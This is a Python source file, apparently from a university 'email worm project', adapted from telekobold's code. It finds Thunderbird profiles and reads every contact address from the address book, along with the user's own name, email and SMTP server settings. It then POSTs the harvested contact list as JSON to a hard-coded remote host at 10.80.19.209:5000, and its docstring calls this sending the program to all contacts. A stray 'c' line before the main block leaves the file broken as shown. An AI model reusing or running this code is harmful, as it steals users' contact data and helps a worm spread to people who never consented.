#!/usr/bin/python

"""
This code was modified from below source to find sender email address and
to email address from "contacts" for purposes of UofA Email Worm project

(c) 2022 telekobold <www.telekobold.de>

***Changes to code done by UofA students trying to complete email worm project***

This software was written solely for the joy of exploring how things work
and the intension of sharing accumulated experiences with others. It shall not
be abused to cause harm to anyone. Please refer to the hacker ethics
<https://www.ccc.de/en/hackerethics>, especially the point "Don't litter other 
people's data."

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR 
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE 
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER 
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, 
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE 
SOFTWARE.
"""

# --------------------------------------------------------------------------
# ------------------------------- imports ----------------------------------
# --------------------------------------------------------------------------

import os
import platform
import sys
import random
from datetime import datetime
import typing
import shutil
import re
import sqlite3
from typing import Tuple
import http.client
import json

# --------------------------------------------------------------------------
# -------------------- global variables and constants ----------------------
# --------------------------------------------------------------------------

# type variables:
ArbitraryType = typing.TypeVar("ArbitraryType")
ArbKeyArbValDict = typing.Dict[ArbitraryType, ArbitraryType]
IntKeyArbValDict = typing.Dict[int, ArbitraryType]
IntKeyStrValDict = typing.Dict[int, str]

INSTALLED_OS: str = platform.system()
LINUX: str = "Linux"
WINDOWS: str = "Windows"
FILES_TO_WRITE_PER_DIR: int = 10

# --------------------------------------------------------------------------
# ------------------ 3rd class payload helper functions --------------------
# --------------------------------------------------------------------------
            
def read_text_file_to_dict(filename: str) -> IntKeyStrValDict:
    """
    Reads the passed text file line by line to a Python dictionary.

    :filename: the absolute file name of a text file.
    :returns:  a Python dictionary whose keys are the line numbers (integer
               values) and the appropriate values being the content of this line
               (string values) in the text file belonging to the passed
               `filename`.
    """
    result = {}
    # TODO: Add error handling if file opening doesn't work (e.g. because of
    # missing access rights). In this case, just continue to the next file.
    with open(filename, "r") as file:
        lines = file.readlines()

    # NOTE: The line indexing starts with 0.
    for i, line in zip(range(len(lines)), lines):
        result[i] = line

    # print("read_text_file_to_dict: result = {}".format(result))
    return result

# --------------------------------------------------------------------------
# ----------------- 2nd class send email helper functions ------------------
# --------------------------------------------------------------------------


def determine_thunderbird_default_file_path() -> str:
    """
    Determines Thunderbird's config directory file path on the current system.
    
    :returns: the absolute file path to Thunderbird's config directory
              or "" if no such file path could be found or if the detected 
              operating system is neither Windows, nor Linux.
    """
    USER_FILE_PATH: str = os.path.expanduser("~")
    THUNDERBIRD_PATH_WINDOWS: str = os.path.join(USER_FILE_PATH, "AppData", "Roaming", "Thunderbird")
    THUNDERBIRD_PATH_LINUX_1: str = os.path.join(USER_FILE_PATH, ".thunderbird")
    THUNDERBIRD_PATH_LINUX_2: str = os.path.join(USER_FILE_PATH, "snap", "thunderbird", "common", ".thunderbird")
    thunderbird_path: str = ""
    
    if INSTALLED_OS == WINDOWS:
        if os.path.isdir(THUNDERBIRD_PATH_WINDOWS):
            thunderbird_path = THUNDERBIRD_PATH_WINDOWS
    elif INSTALLED_OS == LINUX:
        if os.path.isdir(THUNDERBIRD_PATH_LINUX_1):
            thunderbird_path = THUNDERBIRD_PATH_LINUX_1
        elif os.path.isdir(THUNDERBIRD_PATH_LINUX_2):
            thunderbird_path = THUNDERBIRD_PATH_LINUX_2
    #print(thunderbird_path)
    return thunderbird_path


def add_profile_dir_to_list(thunderbird_path: str, line: str, profile_dir_names: typing.List[str]) -> typing.List[str]:
    """
    Helper function for `find_thunderbird_profile_dirs()`.
    
    :thunderbird_path:  The absolute file path to the Thunderbird default
                        config directory.
    :line:              A line of a browsed text file (installs.ini or 
                        profiles.ini).
    :profile_dir_names: A list to add absolute file names to detected
                        Thunderbird profile directories.
    :returns:           `profile_dir_names` with another profile dir extracted
                        from `line` if this profile dir exists on the system
                        and was not already contained in `profile_dir_names`.
    """
    line = line.strip()
    relative_profile_dir_path: str = line.split("=", maxsplit=1)[1]
    # Thunderbird uses the / especially on Windows systems,
    # so it would be wrong to use `os.path.sep`:
    l: typing.List[str] = relative_profile_dir_path.split("/")
    profile_dir_path_part: str = None
    profile_dir_name: str = None
    
    # Append potential subdirectories to the `thunderbird_path`.
    # Usually, the default profile dir should be in a "Profiles" 
    # directory on Windows systems and directly in the current
    # directory on Linux systems.
    relative_profile_dir_path = ""
    for i in range(len(l)-1):
        relative_profile_dir_path = l[i] if relative_profile_dir_path == "" else os.path.join(relative_profile_dir_path, l[i])
    #print(f"relative_profile_dir_path = {relative_profile_dir_path}")
    profile_dir_name = l[len(l)-1]
    profile_dir_name_absolute = os.path.join(thunderbird_path, relative_profile_dir_path, profile_dir_name)
    if os.path.isdir(profile_dir_name_absolute) and profile_dir_name_absolute not in profile_dir_names:
        profile_dir_names.append(profile_dir_name_absolute)
        
    return profile_dir_names

# --------------------------------------------------------------------------
# -----------Not in original file. Added for UofA email worm project--------
# ---------------------Find the smtp server and port------------------------
# --------------------------------------------------------------------------

def find_smtp_port_server(prefs_js_filename: str) -> [str, str]:
    """
    Uses the same path found in read_sender_name_and_email_thunderbird
    Parses the smtp server and port from prefs.js
    Returns values for send_mail
    :param prefs_js_filename:
    :returns: smtp_server, smtp_port
    """

    # Read the prefs.js file
    with open(prefs_js_filename, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    # Extract SMTP server and port
    smtp_server_pattern = re.compile(r'user_pref\("mail.smtpserver.smtp\d+.hostname",\s*"(.*?)"\);')
    smtp_port_pattern = re.compile(r'user_pref\("mail.smtpserver.smtp\d+.port",\s*(.*?)\);')

    smtp_server = None
    smtp_port = None

    for line in lines:
        if smtp_server is None:
            smtp_server_match = smtp_server_pattern.search(line)
            if smtp_server_match:
                smtp_server = smtp_server_match.group(1)

        if smtp_port is None:
            smtp_port_match = smtp_port_pattern.search(line)
            if smtp_port_match:
                smtp_port = smtp_port_match.group(1)

        if smtp_server and smtp_port:
            break

    # if smtp_server and smtp_port:
    #     print(f"SMTP Server: {smtp_server}")
    #     print(f"SMTP Port: {smtp_port}")
    # else:
    #     print("SMTP server or port not found in prefs.js")

    return smtp_server, smtp_port

# --------------------------------------------------------------------------
# ----------------- 1st class send email helper functions ------------------
# --------------------------------------------------------------------------

def determine_possible_paths() -> str:
    """
    Determines possible paths where an executable of Mozilla Thunderbird
    could be located and returns them as possibly extended PATH variable
    in the appropriate syntax, depending on which operating system is installed.
    
    :returns: A possibly extended version of the local PATH variable
              or `None` if no PATH variable could be found or if the detected OS
              is neither "Windows", nor "Linux".
    """
    try:
        paths: str = os.environ["PATH"]
    except KeyError:
        return None
    additional_paths_windows: typing.List[str] = [os.path.join("C:\Program Files", "Mozilla Thunderbird")]
    additional_paths_linux: typing.List[str] = [os.path.join("/home/claas/Documents/thunderbird")]
    additional_paths: typing.List[str] = []
    splitter: str = ""
    
    if INSTALLED_OS == WINDOWS:
        splitter = ";"
        additional_paths = additional_paths_windows
        # print("Windows")
    elif INSTALLED_OS == LINUX:
        splitter = ":"
        additional_paths = additional_paths_linux
    else:
        # Not supported OS
        return None
    read_paths_list = paths.split(splitter)
    for path in additional_paths:
        if path not in read_paths_list:
            paths = paths + splitter + path

    return paths


def find_thunderbird_profile_dirs() -> typing.List[str]:
    """
    Searches the files "installs.ini" and "profiles.ini" for listed profile
    directories and returns them if those directories exist.
    
    If a file "installs.ini" exists, all profile directories referenced in this
    file are returned if those directories exist.
    Otherwise, the default profile directory in "profiles.ini" is returned.
    
    :returns: a list of detected profile directories or `None` if no directory
              could be found or if the installed operating system is neither
              Windows, nor Linux.
    """
    thunderbird_path: str = determine_thunderbird_default_file_path()
    
    installs_ini: str = os.path.join(thunderbird_path, "installs.ini")
    profiles_ini: str = os.path.join(thunderbird_path, "profiles.ini")
    profile_dir_names: typing.List[str] = []
    
    # If there is an installs.ini file, return the file paths of all
    # profile directories referenced in that file if those profile directories 
    # actually exist. Avoid redundant entries.
    if os.path.isfile(installs_ini):
        # print("Use installs.ini file")
        with open(installs_ini, "r") as iif:
            for line in iif:
                if line.startswith("Default="):
                    #print("Default line found!")
                    profile_dir_names = add_profile_dir_to_list(thunderbird_path, line, profile_dir_names)
            # print(f"profile_dir_names = {profile_dir_names}")
            return profile_dir_names
    
    # If there is no installs.ini file, return the file path of the
    # default profile file from the profiles.ini file (the profile file which
    # has a flat "Default=1"). It is assumed that the profiles.ini file
    # is correctly formatted.
    profile_introduction_string_regex = re.compile("\[[0-9a-zA-Z]*\]")
    in_profile_def: bool = False
    path_detected: bool = False
    path_content: str = ""
    default_detected: bool = False
    if os.path.isfile(profiles_ini):
        # print("Use profiles.ini file")
        with open(profiles_ini, "r") as pif:
            for line in pif:
                line = line.strip()
                if line == "":
                    in_profile_def = False
                    path_detected = False
                    default_detected = False
                    path_content = ""
                elif profile_introduction_string_regex.match(line):
                    in_profile_def = True
                elif line.startswith("Path="):
                    path_detected = True
                    path_content = line
                    if in_profile_def and default_detected:
                        profile_dir_names = add_profile_dir_to_list(thunderbird_path, line, profile_dir_names)
                elif line == "Default=1":
                    default_detected = True
                    if in_profile_def and path_detected:
                        profile_dir_names = add_profile_dir_to_list(thunderbird_path, path_content, profile_dir_names)

    # print(f"profile_dir_names = {profile_dir_names}")
    return profile_dir_names


def read_email_addresses_thunderbird(filepath: str) -> typing.List[str]:
    """
    :filepath: the file path to the database (usually the file path to the
               Thunderbird profile directory).
    :returns:  a list of all email addresses as string values contained in 
               Thunderbird's "abook.sqlite" database if this database exists, 
               `None` otherwise.
    """
    database = os.path.join(filepath, "abook.sqlite")
    #print(f"database = {database}")
    con = None
    email_addresses = []
    
    if os.path.isfile(database):
        with sqlite3.connect(database, timeout=15) as con:
            with con:
                cur = con.cursor()
                # TODO also return the associated names:
                cur.execute("SELECT DISTINCT value FROM properties WHERE name='PrimaryEmail'")
                rows = cur.fetchall()
                for row in rows:
                    (email_addr,) = row # unpack the tuple returned by fetchall()
                    email_addresses.append(email_addr)
            # print(f"email_addresses = {email_addresses}")
            return email_addresses
    else:
        # print("cannot find")
        return None
    
    
def read_sender_name_and_email_thunderbird(profile_dir: str) -> Tuple[str, str]:
    """
    Searches for the full name and email address in the user's Thunderbird
    default profile. This is usually the full name and email address the user
    first typed in when setting up Thunderbird.
    
    :profile_dir: the file path to the Thunderbird profile directory.
    :returns:     A tuple containing the user's full name and email address.
                  These values can each be `None` if no corresponding value 
                  could be found.
    """
    # The user's full name is stored in the variable "mail.identity.idn.fullName", 
    # the user's email address in the variable "mail.identity.idn.useremail" in 
    # the file "prefs.js" in the user's Thunderbird profile.
    # Start with "id1". 
    
    user_name = None
    user_email = None
    prefs_js_filename = os.path.join(profile_dir, "prefs.js")
    #print(prefs_js_filename)
    if prefs_js_filename: # if prefs_js_filename is not `None`
        lines = read_text_file_to_dict(prefs_js_filename)
        user_name_regex = r", \"(.+?)\"\);"
        # Regex matching all possible email addresses:
        # email_regex = TODO
        # Email regex including a leading '"' and a trailing '");':
        # email_regex_incl = "\"" + email_regex + "\");"
        email_regex_incl = user_name_regex
        # Search the file "prefs.js" for the user's name:
        for i in lines:
            # If id1 does not exist, try id2, id3, ..., id10
            # (could e.g. be the case if a user deleted an email account):
            count: int = 1
            while count <= 10:
                if f"mail.identity.id{count}.fullName" in lines[i]:
                    break
                count += 1
            if count <= 10:
                # A string.endsWith(substring) check would be better, 
                # but a regular expression should be checked here 
                # instead of a fixed substring...
                user_name_match = re.search(user_name_regex, lines[i])
                if user_name_match:
                    user_name_raw = user_name_match.group()
                    # Remove the leading '"' and the trailing '");' 
                    # to obtain the user name:
                    user_name = user_name_raw[3:len(user_name_raw)-3:1]
                    break # Break the loop since the searched user name was found.
        # Search the file "prefs.js" for the users' email address:
        for i in lines:
            # Assuming that e.g. if there exists a user name stored under
            # "mail.identity.id2.fullName", there is also a corresponding
            # email address stored under "mail.identity.id2.useremail":
            if f"mail.identity.id{count}.useremail" in lines[i]:
                user_email_match = re.search(email_regex_incl, lines[i])
                if user_email_match:
                    user_email_raw = user_email_match.group()
                    user_email = user_email_raw[3:len(user_email_raw)-3:1]
                    break # Break the loop since the search user email address 
                          # was found.
    return (user_name, user_email)


# --------------------------------------------------------------------------
# -------------------------- main functionality ----------------------------
# --------------------------------------------------------------------------


def find_email_addresses_post() -> None:
    """
    Sends this program to all email addresses in the address book of the
    installed Thunderbird client.
    """
    thunderbird_install_path: str = shutil.which("thunderbird", path=determine_possible_paths())
    print(f"thunderbird_install_path = {thunderbird_install_path}")
    if not thunderbird_install_path:
        print("Mozilla Thunderbird is not installed on the system!")
        sys.exit(0)
    else:
        # Detect all Thunderbird profile directories:
        profile_dirs = find_thunderbird_profile_dirs()
        for profile_dir in profile_dirs:
            print(f"profile_dir = {profile_dir}")
            to_email_addresses: typing.List[str] = read_email_addresses_thunderbird(profile_dir)
            print(f"to_email_addresses = {to_email_addresses}")
            sender_name, sender_email = read_sender_name_and_email_thunderbird(profile_dir)
            print(f"sender_name = {sender_name}")
            print(f"sender_email = {sender_email}")
            sender_username = sender_email.split("@")[0]
            prefs_js_filename = os.path.join(profile_dir, "prefs.js")
            smtp_server, smtp_port = find_smtp_port_server(prefs_js_filename)
            print(f"smtp_server = {smtp_server}")
            print(f"smtp_port = {smtp_port}")

            data = {"emails": to_email_addresses
                    }
            json_body = json.dumps(data)
            conn = http.client.HTTPConnection("10.80.19.209", 5000)
            headers = {'Content-Type': 'application/json'
                       }
            conn.request("POST", "/query/", data, headers)
            res = conn.getresponse()
            data = res.read()
            print(data.decode("utf-8"))
c
if __name__ == "__main__":
    random.seed((datetime.now()).strftime("%H%M%S"))
    find_email_addresses_post()